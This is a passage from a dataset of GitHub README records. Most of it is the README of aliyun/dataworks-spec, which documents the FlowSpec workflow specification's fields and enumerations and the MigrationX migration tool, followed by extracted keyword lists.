'introduction']",5,0.0,16.0,"[com.github.spotbugs:spotbugs-maven-plugin,com.h3xstream.findsecbugs:findsecbugs-plugin,io.fabric8:docker-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,12.0,4.0,5212,13.132075471698114,5.419540229885057,"['![License: MIT -> https://img.shields.io/badge/License-MIT-yellow.svg', 'Nginx -> https://img.shields.io/badge/Nginx-009639?style=for-the-badge&logo=nginx&logoColor=white', 'Node.js -> https://img.shields.io/badge/Node%20js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white', 'npm -> https://img.shields.io/badge/npm-CB3837?style=for-the-badge&logo=npm&logoColor=white', 'TypeScript -> https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white', 'Angular -> https://img.shields.io/badge/Angular-DD0031?style=for-the-badge&logo=angular&logoColor=white', 'Docker -> https://img.shields.io/badge/Docker-2CA5E0?style=for-the-badge&logo=docker&logoColor=white', 'Apache Maven -> https://img.shields.io/badge/apache_maven-C71A36?style=for-the-badge&logo=apachemaven&logoColor=white', 'Java -> https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white', 'Spring Boot -> https://img.shields.io/badge/Spring_Boot-F2F4F9?style=for-the-badge&logo=spring-boot', 'Swagger -> https://img.shields.io/badge/Swagger-85EA2D?style=for-the-badge&logo=Swagger&logoColor=white', 'Junit5 -> https://img.shields.io/badge/Junit5-25A162?style=for-the-badge&logo=junit5&logoColor=white']",12
aliyun/dataworks-spec,master,"[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
![version](https://img.shields.io/badge/version-1.2.0-blue)
[![Java CI with Maven](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml/badge.svg)](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml)
[![CN doc](https://img.shields.io/badge/文档-中文版-blue.svg)](./README_zh_CN.md)

# Introduction

* In this project we defined a generic workflow description specification(FlowSpec)
* We developed a FlowSpec based migration tool(MigrationX) to migrate workflow models from different workflow scheduling systems to DataWorks workflow
  model.
* We can use this tool to develop conversion tools for other scheduling system workflow model.

# FlowSpec Field Reference

## CycleWorkflow

CycleWorkflow is the specification of a scheduled workflow that contains task nodes and dependencies

### Fields

| Field Name |                Field Type                 | Required | Description                            |
|:----------:|:-----------------------------------------:|----------|----------------------------------------|
| `version`  |                 `string`                  | Yes      | Version                                |
|   `kind`   |                 `string`                  | Yes      | CycleWorkflow                          |
| `metadata` |          [`Metadata`](#metadata)          | No       | define extra meta data of workflow     |
|   `spec`   | [`CycleWorkflowSpec`](#cycleworkflowspec) | Yes      | specific definition of `CycleWorkflow` |

## ManualWorkflow

ManualWorkflow is the specification of manual triggered workflow consist of task nodes and dependencies

### Fields

| Field Name |                 Field Type                  | Required | Description                             |
|:----------:|:-------------------------------------------:|----------|-----------------------------------------|
| `version`  |                  `string`                   | Yes      | version info                            |
|   `kind`   |                  `string`                   | Yes      | ManualWorkflow                          |
| `metadata` |           [`Metadata`](#metadata)           | No       | define extra meta data of workflow      |
|   `spec`   | [`ManualWorkflowSpec`](#manualworkflowspec) | Yes      | specific definition of `ManualWorkflow` |

## CycleWorkflowSpec

CycleWorkflowSpec the specification of `CycleWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of cycle node definition                    |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|     `triggers`     |         `Array<`[`Trigger`](#trigger)`>`         | No       | list of cycle trigger definition                 |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## ManualWorkflowSpec

ManualWorkflowSpec is the specification of `ManualWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of manual node definition                   |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## Metadata

Defines extra metadata of resource

### Fields

|  Field Name   | Field Type | Required | Description         |
|:-------------:|:----------:|----------|---------------------|
|    `owner`    |  `string`  | No       | owner of spec       |
| `description` |  `string`  | No       | description of spec |

## Node

Node is the definition of workflow node.

### Fields

|    Field Name     |                 Field Type                 | Required | Description                                                                                         |
|:-----------------:|:------------------------------------------:|----------|-----------------------------------------------------------------------------------------------------|
|       `id`        |                   String                   | Yes      | node local identifier in spec                                                                       |                     
|      `name`       |                   String                   | Yes      | node name                                                                                           |                     
|     `script`      |            [`Script`](#script)             | Yes      | referred script define or reference of the node                                                     |                     
|    `functions`    |     `Array<`[`Function`](#function)`>`     | No       | referred functions define or reference of the node                                                  |
|  `fileResources`  | `Array<`[`FileResource`](#fileResource)`>` | No       | referred file resources define or reference of the node                                             |                         
|     `inputs`      |            [`Inputs`](#inputs)             | No       | inputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as inputs of `Node`     |
|     `outputs`     |           [`Outputs`](#outputs)            | No       | outputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as outputs of `Node`   |
| `runtimeResource` |   [`RuntimeResource`](#runtimeResource)    | No       | runtime resource define or reference of the node                                                    |
|   `recurrence`    |                   string                   | No       | `recurrence` defines cycle schedule state of node, see enumerated values: [Recurrence](#recurrence) |
|    `priority`     |                  integer                   | No       | priority of the node, the larger the value, the higher the priority                                 |
|     `timeout`     |                  integer                   | No       | timeout in seconds of the node, node instance will be killed when timed out after specified seconds |
|  `instanceMode`   |                   string                   | No       | instance mode of the node, see enumerated values [InstanceMode](#instancemode)                      |
|    `rerunMode`    |                   string                   | No       | the rerun strategy of the node instance, see enumerated values [RerunMode](#rerunmode)              |

## Flow

The `flow` section of spec defines dependencies of related workflow nodes.

### Fields

| Field Name |               Field Type               | Required | Description                                      |
|:----------:|:--------------------------------------:|----------|--------------------------------------------------|
|  `nodeId`  |                `string`                | Yes      | node identifier of specific node defined in spec |
| `depends`  | `Array<`[`FlowDepend`](#flowDepend)`>` | Yes      | list of nodes depended by the node               |

## FlowDepend

`FlowDepend` define the dependency or relationship between workflow nodes.

| Field Name | Field Type | Required | Description                                                                          |
|:----------:|:----------:|----------|--------------------------------------------------------------------------------------|
|  `nodeId`  |  `string`  | Yes      | node identifier of specific node defined in spec                                     |
|   `type`   |  `string`  | Yes      | dependency type of the node, see enumerated values [DependencyType](#dependencyType) |

## Variable

`Variable` defines variables of workflow. Variables can be used in workflow nodes.

### Fields

| Field Name | Field Type | Required | Description                                                           |
|:----------:|:----------:|----------|-----------------------------------------------------------------------|
|    `id`    |  `string`  | Yes      | local identifier in spec                                              |
|   `name`   |  `string`  | Yes      | variable name                                                         |
|  `scope`   |  `string`  | Yes      | variable scope, see enumerated values [VariableScope](#variableScope) |
|   `type`   |  `string`  | Yes      | variable type, see enumerated values [VariableType](#variableType)    |
|  `value`   |  `string`  | Yes      | variable value expression                                             |

## Script

`Script` defines script source file resources. Scripts can be used in workflow by nodes, functions or resources.

### Fields

|  Field Name  |             Field Type             | Required | Description                                  |
|:------------:|:----------------------------------:|----------|----------------------------------------------|
|     `id`     |              `string`              | Yes      | local identifier in spec                     |
|    `path`    |              `string`              | Yes      | script path                                  |
|  `language`  |              `string`              | No       | script language                              |
|  `runtime`   |        [Runtime](#runtime)         | Yes      | runtime definition of script                 |
| `parameters` | `Array<`[`Variable`](#variable)`>` | No       | list of parameter definitions used by script |

## Trigger

`Trigger` defines the rules of firing time of scheduled nodes.

### Fields

| Field Name  | Field Type | Required | Description                                                                                                     |
|:-----------:|:----------:|----------|-----------------------------------------------------------------------------------------------------------------|
|    `id`     |  `string`  | Yes      | local identifier in spec                                                                                        |
|   `type`    |  `string`  | Yes      | trigger type, values: `Scheduler`, `Manual`                                                                     |
|   `cron`    |  `string`  | No       | cron expression of `Scheudler` Trigger                                                                          | 
| `startTime` |  `string`  | No       | start effect time of `Scheduler` Trigger. nodes will only instanced time in range from `startTime` to `endTime` | 
|  `endTime`  |  `string`  | No       | end of effect time of `Scheduler` Trigger.                                                                      |
| `timezone`  |  `string`  | No       | timezone of the `Scheduler` Trigger                                                                             |

## Artifact

Artifacts can be types like `NodeOutput`, `Table`, `Variable`. `Variable` can be a context variable produced by workflow nodes.

### Table

| Field Name | Field Type | Required | Description         |
|:----------:|:----------:|----------|---------------------|
|   `guid`   |  `string`  | Yes      | table artifact guid |

### NodeOutput

| Field Name | Field Type | Required | Description                      |
|:----------:|:----------:|----------|----------------------------------|
|  `output`  |  `string`  | Yes      | output string identifier of node |

## RuntimeResource

`RuntimeResource` defines runtime resources config are used to run workflow nodes runtime resources, like: resource group, YARN cluster etc.

### Fields

|   Field Name    | Field Type | Required | Description                      |
|:---------------:|:----------:|----------|----------------------------------|
|      `id`       |  `string`  | Yes      | local identifier in spec         |
| `resourceGroup` |  `string`  | Yes      | resource group global identifier |

## FileResource

`FileResource` defines the resource files used by workflow nodes. like jar, python, text file, archive files etc.

### Fields

| Field Name |    Field Type     | Required | Description                 |
|:----------:|:-----------------:|----------|-----------------------------|
|    `id`    |     `string`      | Yes      | local identifier in spec    |
|   `name`   |     `string`      | Yes      | resource file name          |
|  `script`  | [Script](#script) | Yes      | resource file script define |

## Function

User-Define-Function definition that used by workflow nodes.

### Fields

|   Field Name    |                 Field Type                 | Required | Description                    |
|:---------------:|:------------------------------------------:|----------|--------------------------------|
|      `id`       |                  `string`                  | Yes      | local identifier in spec       |
|     `name`      |                  `string`                  | Yes      | name of udf                    |
|    `script`     |             [Script](#script)              | Yes      | script file of udf             |
| `fileResources` | `Array<`[`FileResource`](#fileResource)`>` | No       | list of related file resources |

## Runtime

`Runtime` define the runtime environment of script. like command, runtime engine, image etc.

### Fields

| Field Name | Field Type | Required | Description                                                |
|:----------:|:----------:|----------|------------------------------------------------------------|
|  `engine`  |  `string`  | No       | runtime engine                                             |
| `command`  |  `string`  | No       | command identifier of script runtime execution environment |

## Outputs

Outputs hold parameters, artifacts, and results from a workflow node, `Outputs` can be consumed by another workflow node.

### Fields

|  Field Name   |               Field Type               | Required | Description                                                                           |
|:-------------:|:--------------------------------------:|----------|---------------------------------------------------------------------------------------|
|   `tables`    |      `Array<`[`Table`](#table)`>`      | No       | `tables` are list of artifact tables produced by node                                 |
|  `variables`  |   `Array<`[`Variable`](#variable)`>`   | No       | `variables` are list of `Variable` produced by node                                   |
| `nodeOutputs` | `Array<`[`NodeOutput`](#nodeOutput)`>` | No       | `nodeOutputs` are list of pre-defined node output identifier strings produced by node |

## Inputs

Inputs are the mechanism for passing parameters, artifacts, volumes from one workflow node to another

### Fields

|  Field Name   |              Field Type              | Required | Description                                                                            |
|:-------------:|:------------------------------------:|----------|----------------------------------------------------------------------------------------|
|   `tables`    |   `Array<`[`Artifact`](#table)`>`    | No       | `tables` are a list of artifact tables passed as inputs                                |
|  `variables`  |  `Array<`[`Variable`](#variable)`>`  | No       | `variables` are a list of `Variable` passed as inputs                                  |
| `nodeOutputs` | `Array<`[`Artifact`](#nodeOutput)`>` | No       | `nodeOutputs` are a list of pre-defined node output identifier string passed as inputs |

## Enumerations

### VariableScope

|   Enum Name   | Description                                                                                    |
|:-------------:|------------------------------------------------------------------------------------------------|
| NodeParameter | `NodeParameter` means the variable is avaliable in a specific node                             |
|  NodeContext  | `NodeContext` means the variable is avaliable in downstream nodes that depends on current node |
|   Workflow    | `Workflow` means the variable is avaliable in all nodes that in current workflow               |
|   Workspace   | `Workspace` means the variable is avaliable in all nodes that in current workspace             |
|    Tenant     | `Tenant` means the variable is avaliable in all nodes that in current tenant workspaces        |

### VariableType

| Enum Name | Description                                                                  |
|:---------:|------------------------------------------------------------------------------|
|  System   | `System` means the variable is avaliable a system variable like: `$yyyymmdd` |
| Constant  | `Constant` means the variable is constant value                              |

### DependencyType

|          Enum Name           | Description                                                                                                                                             |
|:----------------------------:|---------------------------------------------------------------------------------------------------------------------------------------------------------|
|            Normal            | `Normal` means the node instance of current cycle instance depends on the specific node instance in the same cycle round                                |
|   CrossCycleDependsOnSelf    | `CrossCycleDependsOnSelf` means the current cycle instance of the node depends on the previous cycle round instance of the node itself                  |
| CrossCycleDependsOnChildren  | `CrossCycleDependsOnChildren` means the current cycle instance of the node depends on the children instance of itself in the previous cycle round       |
| CrossCycleDependsOnOtherNode | `CrossCycleDependsOnOtherNode` means the current cycle instance of the node depends on the specific node instance of itself in the previous cycle round |

### Recurrence

| Enum Name | Description                                                                                                         |
|:---------:|---------------------------------------------------------------------------------------------------------------------|
|  Normal   | `Normal` means node instance code will be executed as defined repeat cycle, node will be instanced by defined cycle |
|   Skip    | `Skip` means node instance will be set success without any code effects, node will be instanced by defined cycle    |
|   Pause   | `Pause` means node instance will be set failure without any code effects, node will be instanced by defined cycle   |

### RerunMode

|   Enum Name    | Description                                                         |
|:--------------:|---------------------------------------------------------------------|
|    Allowed     | `Allowed` means node instance can be rerun without any precondition |
|     Denied     | `Denied` means node instance cannot be rerun on any condition       |
| FailureAllowed | `FailureAllowed` means node instance can be rerun on failure state  |

### InstanceMode

|  Enum Name  | Description                                                              |
|:-----------:|--------------------------------------------------------------------------|
|     T+1     | `T+1` means node modification will be applied effect on the next day     |
| Immediately | `Immediately` means node modification will be applied effect immediately |    

# FlowSpec Examples

FlowSpec can be used to describe a workflow, it is a json file that contains a list of nodes.

## real case

### EMR/CDH case

* EMR: [yaml](./spec/src/main/spec/examples/yaml/emr.yaml) [json](./spec/src/main/spec/examples/json/emr.json)
* CDH: [yaml](./spec/src/main/spec/examples/yaml/cdh.yaml) [json](./spec/src/main/spec/examples/json/cdh.json)

### example without id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case_expanded.yaml)
* [json](./spec/src/main/spec/examples/json/real_case_expanded.json)

### example with id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case.yaml)
* [json](./spec/src/main/spec/examples/json/real_case.json)

## simple example

* [yaml](./spec/src/main/spec/examples/yaml/simple.yaml)
* [json](./spec/src/main/spec/examples/json/simple.json)

## branch node

* [yaml](./spec/src/main/spec/examples/yaml/branch.yaml)
* [json](./spec/src/main/spec/examples/json/branch.json)

## join node

* [yaml](./spec/src/main/spec/examples/yaml/join.yaml)
* [json](./spec/src/main/spec/examples/json/join.json)

## for-each/do-while node

* [yaml](./spec/src/main/spec/examples/yaml/innerflow.yaml)
* [json](./spec/src/main/spec/examples/json/innerflow.json)

## manual workflow

* [yaml](./spec/src/main/spec/examples/yaml/manual_flow.yaml)
* [json](./spec/src/main/spec/examples/json/manual_flow.json)

## emr nodes

* [yaml](./spec/src/main/spec/examples/yaml/script_runtime_template.yaml)
* [json](./spec/src/main/spec/examples/json/script_runtime_template.json)

## resource example

* [yaml](./spec/src/main/spec/examples/yaml/file_resource.yaml)
* [json](./spec/src/main/spec/examples/json/file_resource.json)

## function example

* [yaml](./spec/src/main/spec/examples/yaml/function.yaml)
* [json](./spec/src/main/spec/examples/json/function.json)

## param-hub node

* [yaml](./spec/src/main/spec/examples/yaml/parameter_node.yaml)
* [json](./spec/src/main/spec/examples/json/parameter_node.json)

# FlowSpec example

## DataWorks migration assistant spec package demo

* the directory structure of the spec package is consistent with the directory tree of the DataWorks DataStudio business process interface
* *.sql, *.sh, *.hql are user script source files
* *.flow is the spec file corresponding to the user script source file

```shell
➜  project_c_dw tree
.
└── Business Flow
    ├── project_c_dag_3zq3ei4d6
    │   └── ClickHouse
    │       └── Data Analytics
    │           ├── clickhouse_sql_1.flow
    │           └── clickhouse_sql_1.sql
    └── project_c_demo_workflow_1
        ├── EMR
        │   └── Data Analytics
        │       ├── demo_hive_sql_1.flow
        │       ├── demo_hive_sql_1.hql
        │       ├── demo_pg_sql_1.flow
        │       ├── demo_pg_sql_1.hql
        │       ├── demo_shell_1.flow
        │       ├── demo_shell_1.sh
        │       ├── demo_sql_1.flow
        │       └── demo_sql_1.hql
        └── General
            ├── dep_ck_1
            └── dep_ck_1.flow
```

![DataWorks Migration Package FlowSpec example](docs/images/spec/dw_spec_package_demo-en.jpg)

# FlowSpec Client Tool

MigrationX is a workflow model transformation tool based on FlowSpec.

* [MigrationX](docs/migrationx/index.md)
    * Dolphinscheduler migrate to Dataworks DataStudio in one-click command run
    * Dolphinscheduler export command tool
    * Conversion dolphinscheduler workflow to DataWorks FlowSpec
    * Import FlowSpec package to DataWorks DataStudio with DataWorks OpenAPI

## Architecture

![image](docs/images/architecture-en.jpg)

### Domain Model

Define domain model for different workflow engine, containing domain entities and corresponding operation service

### Reader

Implementations of export reader tools for specific workflow engine.

### Transformer

Implementations of transformation logics between specific workflow engines.

### Writer

Implementations of import writer tools for specific workflow engine.

### Usage

[Usage](docs/migrationx/usage.md)

# Modules

* migrationx-common: common module
* migrationx-domain: domain model of specific workflow engine
* migrationx-reader: export reader implementation of specific workflow engine
* migrationx-transformer: transformer implementation of specific workflow engine
* migrationx-writer: import write implementation of specific workflow engine

# Develop guide

[Develop guide](docs/dev/develop-guide.md)

# Contributors

* Alibaba Cloud-DataWorks-Develop & Modeling & Analytics Team
",0,2,21,apache-2.0,13.0,"['introduction', 'project', 'defined', 'generic', 'workflow', 'description', 'specification', 'flowspec', 'developed', 'flowspec', 'based', 'migration', 'tool', 'migrationx', 'migrate', 'workflow', 'model', 'different', 'workflow', 'scheduling', 'system', 'dataworks', 'workflow', 'model', 'use', 'tool', 'develop', 'conversion', 'tool', 'scheduling', 'system', 'workflow', 'model', 'flowspec', 'field', 'reference', 'cycleworkflow', 'cycleworkflow', 'specification', 'scheduled', 'workflow', 'contains', 'task', 'node', 'dependency', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'version', 'yes', 'cycleworkflow', 'define', 'extra', 'meta', 'data', 'workflow', 'yes', 'specific', 'definition', 'manualworkflow', 'manualworkflow', 'specification', 'manual', 'triggered', 'workflow', 'consist', 'task', 'node', 'dependency', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'version', 'info', 'yes', 'manualworkflow', 'define', 'extra', 'meta', 'data', 'workflow', 'yes', 'specific', 'definition', 'cycleworkflowspec', 'cycleworkflowspec', 'specification', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'list', 'cycle', 'node', 'definition', 'list', 'variable', 'definition', 'list', 'script', 'definition', 'list', 'cycle', 'trigger', 'definition', 'list', 'artifact', 'definition', 'list', 'runtime', 'resource', 'definition', 'list', 'file', 'resource', 'definition', 'list', 'function', 'definition', 'list', 'flow', 'defines', 'node', 'dependent', 'relationship', 'manualworkflowspec', 'manualworkflowspec', 'specification', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'list', 'manual', 'node', 'definition', 'list', 'variable', 'definition', 'list', 'script', 'definition', 'list', 'artifact', 'definition', 'list', 'runtime', 'resource', 'definition', 'list', 'file', 'resource', 'definition', 'list', 'function', 'definition', 'list', 'flow', 'defines', 'node', 'dependent', 'relationship', 'metadata', 'defines', 'extra', 'metadata', 'resource', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'owner', 'spec', 'description', 'spec', 'node', 'node', 'definition', 'workflow', 'node', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'string', 'yes', 'node', 'local', 'identifier', 'spec', 'string', 'yes', 'node', 'name', 'yes', 'referred', 'script', 'define', 'reference', 'node', 'referred', 'function', 'define', 'reference', 'node', 'referred', 'file', 'resource', 'define', 'reference', 'node', 'input', 'node', 'used', 'input', 'output', 'node', 'used', 'output', 'runtime', 'resource', 'define', 'reference', 'node', 'string', 'defines', 'cycle', 'schedule', 'state', 'node', 'see', 'enumerated', 'value', 'recurrence', 'integer', 'priority', 'node', 'larger', 'value', 'higher', 'priority', 'integer', 'timeout', 'second', 'node', 'node', 'instance', 'killed', 'timed', 'specified', 'second', 'string', 'instance', 'mode', 'node', 'see', 'enumerated', 'value', 'instancemode', 'string', 'rerun', 'strategy', 'node', 'instance', 'see', 'enumerated', 'value', 'rerunmode', 'flow', 'section', 'spec', 'defines', 'dependency', 'related', 'workflow', 'node', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'node', 'identifier', 'specific', 'node', 'defined', 'spec', 'yes', 'list', 'node', 'depended', 'node', 'flowdepend', 'define', 'dependency', 'relationship', 'workflow', 'node', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'node', 'identifier', 'specific', 'node', 'defined', 'spec', 'yes', 'dependency', 'type', 'node', 'see', 'enumerated', 'value', 'dependencytype', 'variable', 'defines', 'variable', 'workflow', 'variables', 'used', 'workflow', 'node', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'local', 'identifier', 'spec', 'yes', 'variable', 'name', 'yes', 'variable', 'scope', 'see', 'enumerated', 'value', 'variablescope', 'yes', 'variable', 'type', 'see', 'enumerated', 'value', 'variabletype', 'yes', 'variable', 'value', 'expression', 'script', 'defines', 'script', 'source', 'file', 'resource', 'script', 'used', 'workflow', 'node', 'function', 'resource', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'local', 'identifier', 'spec', 'yes', 'script', 'path', 'script', 'language', 'runtime', 'yes', 'runtime', 'definition', 'script', 'list', 'parameter', 'definition', 'used', 'script', 'trigger', 'defines', 'rule', 'firing', 'time', 'scheduled', 'node', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'local', 'identifier', 'spec', 'yes', 'trigger', 'type', 'value', 'cron', 'expression', 'trigger', 'start', 'effect', 'time', 'trigger', 'node', 'instanced', 'time', 'range', 'end', 'effect', 'time', 'trigger', 'timezone', 'trigger', 'artifact', 'artifact', 'type', 'like', 'context', 'variable', 'produced', 'workflow', 'node', 'table', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'table', 'artifact', 'guid', 'nodeoutput', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'output', 'string', 'identifier', 'node', 'runtimeresource', 'defines', 'runtime', 'resource', 'config', 'used', 'run', 'workflow', 'node', 'runtime', 'resource', 'like', 'resource', 'group', 'yarn', 'cluster', 'etc', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'local', 'identifier', 'spec', 'yes', 'resource', 'group', 'global', 'identifier', 'fileresource', 'defines', 'resource', 'file', 'used', 'workflow', 'node', 'like', 'jar', 'python', 'text', 'file', 'archive', 'file', 'etc', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'local', 'identifier', 'spec', 'yes', 'resource', 'file', 'name', 'script', 'yes', 'resource', 'file', 'script', 'define', 'function', 'definition', 'used', 'workflow', 'node', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'yes', 'local', 'identifier', 'spec', 'yes', 'name', 'udf', 'script', 'yes', 'script', 'file', 'udf', 'list', 'related', 'file', 'resource', 'runtime', 'define', 'runtime', 'environment', 'script', 'like', 'command', 'runtime', 'engine', 'image', 'etc', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'runtime', 'engine', 'command', 'identifier', 'script', 'runtime', 'execution', 'environment', 'output', 'output', 'hold', 'parameter', 'artifact', 'result', 'workflow', 'node', 'consumed', 'another', 'workflow', 'node', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'list', 'artifact', 'table', 'produced', 'node', 'list', 'produced', 'node', 'list', 'node', 'output', 'identifier', 'string', 'produced', 'node', 'input', 'input', 'mechanism', 'passing', 'parameter', 'artifact', 'volume', 'one', 'workflow', 'node', 'another', 'field', 'field', 'name', 'field', 'type', 'required', 'description', 'list', 'artifact', 'table', 'passed', 'input', 'list', 'passed', 'input', 'list', 'node', 'output', 'identifier', 'string', 'passed', 'input', 'enumeration', 'variablescope', 'enum', 'name', 'description', 'nodeparameter', 'mean', 'variable', 'avaliable', 'specific', 'node', 'nodecontext', 'mean', 'variable', 'avaliable', 'downstream', 'node', 'depends', 'current', 'node', 'workflow', 'mean', 'variable', 'avaliable', 'node', 'current', 'workflow', 'workspace', 'mean', 'variable', 'avaliable', 'node', 'current', 'workspace', 'tenant', 'mean', 'variable', 'avaliable', 'node', 'current', 'tenant', 'workspace', 'variabletype', 'enum', 'name', 'description', 'system', 'mean', 'variable', 'avaliable', 'system', 'variable', 'like', 'constant', 'mean', 'variable', 'constant', 'value', 'dependencytype', 'enum', 'name', 'description', 'normal', 'mean', 'node', 'instance', 'current', 'cycle', 'instance', 'depends', 'specific', 'node', 'instance', 'cycle', 'round', 'crosscycledependsonself', 'mean', 'current', 'cycle', 'instance', 'node', 'depends', 'previous', 'cycle', 'round', 'instance', 'node', 'crosscycledependsonchildren', 'mean', 'current', 'cycle', 'instance', 'node', 'depends', 'child', 'instance', 'previous', 'cycle', 'round', 'crosscycledependsonothernode', 'mean', 'current', 'cycle', 'instance', 'node', 'depends', 'specific', 'node', 'instance', 'previous', 'cycle', 'round', 'recurrence', 'enum', 'name', 'description', 'normal', 'mean', 'node', 'instance', 'code', 'executed', 'defined', 'repeat', 'cycle', 'node', 'instanced', 'defined', 'cycle', 'skip', 'mean', 'node', 'instance', 'set', 'success', 'without', 'code', 'effect', 'node', 'instanced', 'defined', 'cycle', 'pause', 'mean', 'node', 'instance', 'set', 'failure', 'without', 'code', 'effect', 'node', 'instanced', 'defined', 'cycle', 'rerunmode', 'enum', 'name', 'description', 'allowed', 'mean', 'node', 'instance', 'rerun', 'without', 'precondition', 'denied', 'mean', 'node', 'instance', 'rerun', 'condition', 'failureallowed', 'mean', 'node', 'instance', 'rerun', 'failure', 'state', 'instancemode', 'enum', 'name', 'description', 'mean', 'node', 'modification', 'applied', 'effect', 'next', 'day', 'immediately', 'mean', 'node', 'modification', 'applied', 'effect', 'immediately', 'flowspec', 'example', 'flowspec', 'used', 'describe', 'workflow', 'json', 'file', 'contains', 'list', 'node', 'real', 'case', 'case', 'emr', 'yaml', 'json', 'cdh', 'yaml', 'json', 'example', 'without', 'id', 'variable', 'reference', 'yaml', 'json', 'example', 'id', 'variable', 'reference', 'yaml', 'json', 'simple', 'example', 'yaml', 'json', 'branch', 'node', 'yaml', 'json', 'join', 'node', 'yaml', 'json', 'node', 'yaml', 'json', 'manual', 'workflow', 'yaml', 'json', 'emr', 'node', 'yaml', 'json', 'resource', 'example', 'yaml', 'json', 'function', 'example', 'yaml', 'json', 'node', 'yaml', 'json', 'flowspec', 'example', 'dataworks', 'migration', 'assistant', 'spec', 'package', 'demo', 'directory', 'structure', 'spec', 'package', 'consistent', 'directory', 'tree', 'dataworks', 'datastudio', 'business', 'process', 'interface', 'user', 'script', 'source', 'file', 'spec', 'file', 'corresponding', 'user', 'script', 'source', 'file', 'flowspec', 'client', 'tool', 'migrationx', 'workflow', 'model', 'transformation', 'tool', 'based', 'flowspec', 'migrationx', 'dolphinscheduler', 'migrate', 'dataworks', 'datastudio', 'command', 'run', 'dolphinscheduler', 'export', 'command', 'tool', 'conversion', 'dolphinscheduler', 'workflow', 'dataworks', 'flowspec', 'import', 'flowspec', 'package', 'dataworks', 'datastudio', 'dataworks', 'openapi', 'architecture', 'domain', 'model', 'define', 'domain', 'model', 'different', 'workflow', 'engine', 'containing', 'domain', 'entity', 'corresponding', 'operation', 'service', 'reader', 'implementation', 'export', 'reader', 'tool', 'specific', 'workflow', 'engine', 'transformer', 'implementation', 'transformation', 'logic', 'specific', 'workflow', 'engine', 'writer', 'implementation', 'import', 'writer', 'tool', 'specific', 'workflow', 'engine', 'usage', 'usage', 'module', 'common', 'module', 'domain', 'model', 'specific', 'workflow', 'engine', 'export', 'reader', 'implementation', 'specific', 'workflow', 'engine', 'transformer', 'implementation', 'specific', 'workflow', 'engine', 'import', 'write', 'implementation', 'specific', 'workflow', 'engine', 'develop', 'guide', 'develop', 'guide', 'contributor', 'alibaba', 'modeling', 'analytics', 'team']","['node', 'field', 'workflow', 'yes', 'name']",34,0,0,"['introduction', 'flowspec', 'field', 'reference', 'cycleworkflow', 'field', 'manualworkflow', 'field', 'cycleworkflowspec', 'field', 'manualworkflowspec', 'field', 'metadata', 'field', 'node', 'field', 'flow', 'field', 'flowdepend', 'variable', 'field', 'script', 'field', 'trigger', 'field', 'artifact', 'table', 'nodeoutput', 'runtimeresource', 'field', 'fileresource', 'field', 'function', 'field', 'runtime', 'field', 'output', 'field', 'input', 'field', 'enumeration', 'variablescope', 'variabletype', 'dependencytype', 'recurrence', 'rerunmode', 'instancemode', 'flowspec', 'example', 'real', 'case', 'case', 'example', 'without', 'id', 'variable', 'reference', 'example', 'id', 'variable', 'reference', 